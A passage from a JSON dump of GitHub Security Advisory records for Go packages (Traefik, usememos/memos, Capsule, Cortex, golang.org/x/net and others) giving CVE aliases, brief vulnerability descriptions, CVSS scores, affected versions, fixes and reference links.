Type:\n\n```\n{\"level\":\"error\",\"msg\":\"unknown client auth type \\\"FooClientAuthType\\\"\",\"routerName\":\"Router0@file\"}\n```\n\n- Invalid cipherSuites\n\n```\n{\"level\":\"error\",\"msg\":\"invalid CipherSuite: foobar\",\"routerName\":\"Router0@file\"}\n```\n\n- Invalid curvePreferences\n\n```\n{\"level\":\"error\",\"msg\":\"invalid CurveID in curvePreferences: foobar\",\"routerName\":\"Router0@file\"}\n``` \n\n## For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.9.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/traefik/traefik/security/advisories/GHSA-468w-8x39-gj5v"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-46153"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/commit/7e3fe48b80083b41e9ff82a474a36484cabc701a"}, {"type": "WEB", "url": "https://doc.traefik.io/traefik/v2.9/https/tls/#tls-options"}, {"type": "PACKAGE", "url": "https://github.com/traefik/traefik"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v2.9.6"}], "database_specific": {"cwe_ids": ["CWE-295"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-08T16:11:12Z", "nvd_published_at": "2022-12-08T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qvx2-59g8-8hph", "modified": "2023-01-06T03:15:39Z", "published": "2022-12-25T21:30:21Z", "aliases": ["CVE-2022-4741"], "summary": "docconv vulnerable to Memory Allocation with Excessive Size Value", "details": "A vulnerability was found in docconv up to 1.2.0 and classified as problematic. This issue affects the function `ConvertDocx/ConvertODT/ConvertPages/ConvertXML/XMLToText`. The manipulation leads to uncontrolled memory allocation. The attack may be initiated remotely. Upgrading to version 1.2.1 can address this issue. The name of the patch is 42bcff666855ab978e67a9041d0cdea552f20301. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-216779.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sajari/docconv"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.1"}]}]}, {"package": {"ecosystem": "Go", "name": "code.sajari.com/docconv"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4741"}, {"type": "WEB", "url": "https://github.com/sajari/docconv/pull/111"}, {"type": "WEB", "url": "https://github.com/sajari/docconv/commit/42bcff666855ab978e67a9041d0cdea552f20301"}, {"type": "PACKAGE", "url": "https://github.com/sajari/docconv"}, {"type": "WEB", "url": "https://github.com/sajari/docconv/releases/tag/v1.2.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1188"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.216779"}, {"type": "WEB", "url": "https://vuldb.com/?id.216779"}], "database_specific": {"cwe_ids": ["CWE-789"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T17:19:54Z", "nvd_published_at": "2022-12-25T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c8jh-vcjh-fx2w", "modified": "2023-01-02T17:03:13Z", "published": "2022-12-23T12:30:25Z", "aliases": ["CVE-2022-4690"], "summary": "usememos/memos vulnerable to stored cross-site scripting (XSS)", "details": "usememos/memos is an open-source, self-hosted memo hub with knowledge management and socialization. Memos prior to 0.9.0 has a feature to upload file and display it, and by uploading a crafted SVG file, an attacker could perform a stored cross-site scripting attack with the image direct link. This was patched in version 0.9.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4690"}, {"type": "WEB", "url": "https://github.com/usememos/memos/pull/833"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/65cc19c12efa392f792f6bb154b4838547e0af5e"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c07b4a57caa89905e54b800f4d8fb720bbf5bf82"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos/"}, {"type": "WEB", "url": "https://huntr.dev/bounties/7e1be91d-3b13-4300-8af2-9bd9665ec335"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-27T01:29:44Z", "nvd_published_at": "2022-12-23T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rprg-4v7q-87v7", "modified": "2022-12-12T20:44:53Z", "published": "2022-12-08T18:30:50Z", "aliases": ["CVE-2022-4123"], "summary": "Buildah (as part of Podman) vulnerable to Path Traversal", "details": "A flaw was found in Buildah. The local path and the lowest subdirectory may be disclosed due to incorrect absolute path traversal, resulting in an impact to confidentiality.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/podman/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "4.1.0-rc1"}, {"last_affected": "4.4.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4123"}, {"type": "WEB", "url": "https://github.com/containers/podman/issues/13293"}, {"type": "WEB", "url": "https://github.com/containers/podman/pull/13531"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2144989"}, {"type": "PACKAGE", "url": "https://github.com/containers/podman"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1159"}], "database_specific": {"cwe_ids": ["CWE-23"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-12-08T23:59:57Z", "nvd_published_at": "2022-12-08T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x45c-cvp8-q4fm", "modified": "2022-12-06T16:20:39Z", "published": "2022-12-05T23:08:37Z", "aliases": ["CVE-2022-46167"], "summary": "Capsule vulnerable to privilege escalation by ServiceAccount deployed in a Tenant Namespace", "details": "Capsule implements a multi-tenant and policy-based environment in a Kubernetes cluster. A ServiceAccount deployed in a Tenant Namespace, when granted with `PATCH` capabilities on its own Namespace, is able to edit it and remove the Owner Reference, breaking the reconciliation of the Capsule Operator and removing all the enforcement like Pod Security annotations, Network Policies, Limit Range and Resource Quota items.\n\nWith that said, an attacker could detach the Namespace from a Tenant that is forbidding starting privileged Pods using the Pod Security labels by removing the OwnerReference, removing the enforcement labels, and being able to start privileged containers that would be able to start a generic Kubernetes privilege escalation.\n\n### Patches\n\nPatches have been released for version 0.1.3 and all users must upgrade to this release.\n\n### Workarounds\n\nN.A.\n\n### References\n\nN.A.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [github.com/clastix/capsule](https://github.com/clastix/capsule)\n* Reach out on [#capsule](https://kubernetes.slack.com/archives/C03GETTJQRL) channel available on Kubernetes Slack workspace\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/clastix/capsule"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.1.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.1.2"}}], "references": [{"type": "WEB", "url": "https://github.com/clastix/capsule/security/advisories/GHSA-x45c-cvp8-q4fm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-46167"}, {"type": "WEB", "url": "https://github.com/clastix/capsule/commit/1df430e71be8c4778c82eca3459978ad7d0b4b7b"}, {"type": "WEB", "url": "https://github.com/clastix/capsule/commit/75525ac19254b0c5111e34d7985e2be7bc8b1ac1"}, {"type": "PACKAGE", "url": "https://github.com/clastix/capsule"}, {"type": "WEB", "url": "https://github.com/clastix/capsule/releases/tag/v0.1.3"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-05T23:08:37Z", "nvd_published_at": "2022-12-02T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gw9m-2m5v-c6x5", "modified": "2023-01-10T00:53:55Z", "published": "2022-12-29T18:30:24Z", "aliases": ["CVE-2022-4845"], "summary": "usememos/memos Cross-Site Request Forgery vulnerability", "details": "Cross-Site Request Forgery (CSRF) in GitHub repository usememos/memos prior to 0.9.1", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4845"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c9bb2b785dc5852655405d5c9ab127a2d5aa3948"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/075dbd51-b078-436c-9e3d-7f25cd2e7e1b"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:53:20Z", "nvd_published_at": "2022-12-29T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cq2g-pw6q-hf7j", "modified": "2023-10-02T11:04:41Z", "published": "2022-12-19T21:09:05Z", "aliases": ["CVE-2022-23536"], "summary": "Cortex's Alertmanager can expose local files content via specially crafted config", "details": "### Impact\n\nA local file inclusion vulnerability exists in Cortex versions v1.13.0, v1.13.1 and v1.14.0, where a malicious actor could remotely read local files as a result of parsing maliciously crafted Alertmanager configurations when submitted to the [Alertmanager Set Configuration API](https://cortexmetrics.io/docs/api/#set-alertmanager-configuration). Only users of the Cortex Alertmanager service using `-experimental.alertmanager.enable-api` or `enable_api: true` are affected.\n\n### Specific Go Packages Affected\ngithub.com/cortexproject/cortex/pkg/alertmanager\n\n### Patches\nAffected Cortex users are advised to upgrade to versions 1.13.2 or 1.14.1.\n\n### Workarounds\nPatching is ultimately advised. Using out-of-bound validation, Cortex administrators may reject Alertmanager configurations containing the `api_key_file` setting in the `opsgenie_configs` section and `opsgenie_api_key_file` in the `global` section before sending to the [Set Alertmanager Configuration API](https://cortexmetrics.io/docs/api/#set-alertmanager-configuration) as a workaround.\n\n### References\n- Fixed Versions:\n   - https://github.com/cortexproject/cortex/releases/tag/v1.14.1\n   - https://github.com/cortexproject/cortex/releases/tag/v1.13.2\n- https://cortexmetrics.io/docs/api/#set-alertmanager-configuration\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [cortex](https://github.com/cortexproject/cortex/issues/new/choose)\n* Email us at [cortex-team@googlegroups.com](mailto:cortex-team@googlegroups.com).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cortexproject/cortex"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.14.0"}, {"fixed": "1.14.1"}]}], "versions": ["1.14.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/cortexproject/cortex"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cortexproject/cortex/security/advisories/GHSA-cq2g-pw6q-hf7j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23536"}, {"type": "WEB", "url": "https://github.com/cortexproject/cortex/commit/03e023d8b012887b31cc268d0d011b01e1e65506"}, {"type": "WEB", "url": "https://cortexmetrics.io/docs/api/#set-alertmanager-configuration"}, {"type": "PACKAGE", "url": "https://github.com/cortexproject/cortex"}, {"type": "WEB", "url": "https://github.com/cortexproject/cortex/releases/tag/v1.13.2"}, {"type": "WEB", "url": "https://github.com/cortexproject/cortex/releases/tag/v1.14.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1175"}], "database_specific": {"cwe_ids": ["CWE-184", "CWE-641", "CWE-73"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-19T21:09:05Z", "nvd_published_at": "2022-12-19T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qrrf-xvcf-p64q", "modified": "2023-01-10T15:45:39Z", "published": "2022-12-28T15:30:45Z", "aliases": ["CVE-2022-4797"], "summary": "usememos/memos vulnerable Improper Restriction of Excessive Authentication Attempts ", "details": "In usememos/memos 0.9.0 and prior, an attacker can delete other users' posts via post id, which can be done via brute force.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4797"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/5233f76f-016b-4c65-b019-2c5d27802a1b"}], "database_specific": {"cwe_ids": ["CWE-307"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:53:10Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xrjj-mj9h-534m", "modified": "2023-01-18T00:05:16Z", "published": "2022-12-08T21:30:19Z", "aliases": ["CVE-2022-41717"], "summary": "golang.org/x/net/http2 vulnerable to possible excessive memory growth", "details": "An attacker can cause excessive memory growth in a Go server accepting HTTP/2 requests. HTTP/2 server connections contain a cache of HTTP header keys sent by the client. While the total number of entries in this cache is capped, an attacker sending very large keys can cause the server to allocate approximately 64 MiB per open connection.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net/http2"}, "ecosystem_specific": {"affected_functions": ["Server.ServeConn"]}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-41717"}, {"type": "PACKAGE", "url": "https://cs.opensource.google/go/x/net"}, {"type": "WEB", "url": "https://go.dev/cl/455635"}, {"type": "WEB", "url": "https://go.dev/cl/455717"}, {"type": "WEB", "url": "https://go.dev/issue/56350"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/L_3rmdT0BMU/m/yZDrXjIiBQAJ"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4BUK2ZIAGCULOOYDNH25JPU6JBES5NF2/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4SBIUECMLNC572P23DDOKJNKPJVX26SP/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/56B2FFESRYYP6IY2AZ3UWXLWKZ5IYZN4/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ANIOPUXWIHVRA6CEWXCGOMX3YYS6KFHG/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NQGNAXK3YBPMUP3J4TECIRDHFGW37522/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PUM4DIVOLJCBK5ZDP4LJOL24GXT3YSIR/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PW3XC47AUW5J5M2ULJX7WCCL3B2ETLMT/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/Q52IQI754YAE4XPR4QBRWPIVZWYGZ4FS/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QBKBAZBIOXZV5QCFHZNSVXULR32XJCYD/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/REMHVVIBDNKSRKNOTV7EQSB7CYQWOUOU/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/T7N5GV4CHH6WAGX3GFMDD3COEOVCZ4RI/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WPEIZ7AMEJCZXU3FEJZMVRNHQZXX5P3I/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1144"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-18T00:05:16Z", "nvd_published_at": "2022-12-08T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6cmv-2548-82v4", "modified": "2023-10-20T23:01:17Z", "published": "2022-12-21T21:30:15Z", "aliases": ["CVE-2021-4263"], "summary": "leanote vulnerable to cross-site scripting", "details": "A vulnerability, which was classified as problematic, has been found in leanote. This issue affects the function define of the file `public/js/plugins/history.js`. The manipulation of the argument content leads to cross site scripting. The attack may be initiated remotely. The name of the patch is https:/github.com/leanote/leanote/commit/0f9733c890077942150696dcc6d2b1482b7a0a19. It is recommended to apply a patch to fix this issue. The identifier VDB-216461 was assigned to this vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/leanote/leanote"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "2.6.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-4263"}, {"type": "WEB", "url": "https://github.com/leanote/leanote/commit/0f9733c890077942150696dcc6d2b1482b7a0a19"}, {"type": "PACKAGE", "url": "https://github.com/leanote/leanote"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.216461"}, {"type": "WEB", "url": "https://vuldb.com/?id.216461"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-10-20T23:01:17Z", "nvd_published_at": "2022-12-21T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vp56-r7qv-783v", "modified": "2023-01-10T15:58:40Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2020-36559"], "summary": "ahh vulnerable to Path Traversal", "details": "Due to improper santization of user input, HTTPEngine.Handle allows for directory traversal, allowing an attacker to read files outside of the target directory that the server has permission to read.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-aah/aah"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.4"}]}]}, {"package": {"ecosystem": "Go", "name": "aahframe.work"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36559"}, {"type": "WEB", "url": "https://github.com/go-aah/aah/issues/266"}, {"type": "WEB", "url": "https://github.com/go-aah/aah/pull/267"}, {"type": "WEB", "url": "https://github.com/go-aah/aah/commit/881dc9f71d1f7a4e8a9a39df9c5c081d3a2da1ec"}, {"type": "PACKAGE", "url": "https://github.com/go-aah/aah"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0033"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:07:19Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pwhr-p68w-296x", "modified": "2023-01-10T15:35:16Z", "published": "2022-12-29T18:30:24Z", "aliases": ["CVE-2022-4840"], "summary": "usememos/memos vulnerable to stored Cross-site Scripting", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository usememos/memos 0.9.0 and prior.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4840"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/64e5c343c5f74b0abdf3ac0d21a6139daea58cf8"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/b42aa2e9-c783-464c-915c-a80cb464ee01"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:53:37Z", "nvd_published_at": "2022-12-29T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jpf8-h7h7-3ppm", "modified": "2023-08-30T11:49:22Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2020-36566"], "summary": "tar-utils Path Traversal vulnerability", "details": "Due to improper path sanitization, archives containing relative file paths can cause files to be written (or overwritten) outside of the target directory.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/whyrusleeping/tar-utils"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20201201191210-20a61371de5b"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36566"}, {"type": "WEB", "url": "https://github.com/whyrusleeping/tar-utils/commit/20a61371de5b51380bbdb0c7935b30b0625ac227"}, {"type": "PACKAGE", "url": "https://github.com/whyrusleeping/tar-utils"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0106"}, {"type": "WEB", "url": "https://snyk.io/research/zip-slip-vulnerability"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:05:32Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9h6h-9g78-86f7", "modified": "2022-12-29T01:50:20Z", "published": "2022-12-29T01:50:20Z", "aliases": [], "summary": "Yapscan's report receiver server vulnerable to path traversal and log injection", "details": "### Impact\n\nIf you make use of the **report receiver server** (experimental), a client may be able to forge requests such that arbitrary files on the host can be overwritten (subject to permissions of the yapscan server), leading to loss of data. This is particularly problematic if you do not authenticate clients and/or run the server with elevated permissions.\n\n### Patches\n\nVulnerable versions:\n\n- v0.18.0\n- v0.19.0 (unreleased)\n\nThis problem is patched in version v0.19.1\n\n### Workarounds\n\nUpdate to the newer version is highly encouraged!\n\nMeasures to reduce the risk of this include authenticating clients (see `--client-ca` flag) and containerization of the yapscan server.\n\n### References\n\nThe tracking issue is #35. There you can find the commits, fixing the issue.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/fkie-cad/yapscan"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.18.0"}, {"fixed": "0.19.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fkie-cad/yapscan/security/advisories/GHSA-9h6h-9g78-86f7"}, {"type": "WEB", "url": "https://github.com/fkie-cad/yapscan/issues/35"}, {"type": "WEB", "url": "https://github.com/fkie-cad/yapscan/commit/a75a20b50be673b96b1d42187b97f8cfe60728df"}, {"type": "WEB", "url": "https://github.com/fkie-cad/yapscan/commit/fef9a33ceb66f6b929839f7eaf393b629681bc5d"}, {"type": "PACKAGE", "url": "https://github.com/fkie-cad/yapscan"}, {"type": "WEB", "url": "https://github.com/fkie-cad/yapscan/releases/tag/v0.19.1"}], "database_specific": {"cwe_ids": ["CWE-117", "CWE-22", "CWE-73"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-29T01:50:20Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-hrm3-3xm6-x33h", "modified": "2023-01-10T15:49:55Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2020-36569"], "summary": "golang-nanoauth authentication bypass vulnerability", "details": "Authentication is globally bypassed in github.com/nanobox-io/golang-nanoauth between v0.0.0-20160722212129-ac0cc4484ad4 and v0.0.0-20200131131040-063a3fb69896 if ListenAndServe is called with an empty token.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nanobox-io/golang-nanoauth"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.0.0-20160722212129-ac0cc4484ad4"}, {"fixed": "0.0.0-20200131131040-063a3fb69896"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36569"}, {"type": "WEB", "url": "https://github.com/nanobox-io/golang-nanoauth/pull/5"}, {"type": "WEB", "url": "https://github.com/nanobox-io/golang-nanoauth/commit/063a3fb69896acf985759f0fe3851f15973993f3"}, {"type": "PACKAGE", "url": "https://github.com/nanobox-io/golang-nanoauth"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0004"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-305"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-12-30T18:54:51Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9v48-2h5x-fvpm", "modified": "2023-01-23T19:32:20Z", "published": "2022-12-23T12:30:25Z", "aliases": ["CVE-2022-4685"], "summary": "usememos/memos vulnerable to improper access control", "details": "Improper Access Control in GitHub repository usememos/memos prior to 0.9.0.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4685"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/dca35bde877aab6e64ef51b52e590b5d48f692f9"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/015dbf52-8924-4aad-86d7-892cb61157af"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-29T01:50:36Z", "nvd_published_at": "2022-12-23T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jpgg-cp2x-qrw3", "modified": "2023-08-29T18:58:37Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2021-4236"], "summary": "ecnepsnai/web vulnerable to Uncontrolled Resource Consumption", "details": "Web Sockets do not execute any AuthenticateMethod methods which may be set, leading to a nil pointer dereference if the returned UserData pointer is assumed to be non-nil, or authentication bypass. This issue only affects WebSockets with an AuthenticateMethod hook. Request handlers that do not explicitly use WebSockets are not vulnerable.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ecnepsnai/web"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.5.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-4236"}, {"type": "WEB", "url": "https://github.com/ecnepsnai/web/commit/5a78f8d5c41ce60dcf9f61aaf47a7a8dc3e0002f"}, {"type": "PACKAGE", "url": "https://github.com/ecnepsnai/web"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0107"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-476"], "severity": "CRITICAL", 